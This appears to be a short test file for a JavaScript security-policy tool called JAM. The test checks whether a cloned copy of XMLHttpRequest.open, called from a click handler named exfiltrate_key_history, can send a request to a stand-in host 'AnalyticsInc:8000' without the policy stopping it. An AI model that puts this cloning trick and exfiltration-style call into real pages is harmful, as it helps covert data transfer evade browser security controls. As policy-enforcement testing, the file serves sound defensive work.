
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  xmlhttp.open.clone = function() {
    var that = this;
    var temp = function temporary() {
      return that.apply(this, arguments);
    };
    var key$$14;
    for (key$$14 in this) {
      if (this.hasOwnProperty(key$$14)) {
        temp[key$$14] = this[key$$14];
      }
    }
    return temp;
  };
  xmlhttp.opennew = xmlhttp.open.clone();
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true);
  xmlhttp.send(null);
}
document.getElementById("test").onclick = exfiltrate_key_history

}

JAM.stopProfile('load');
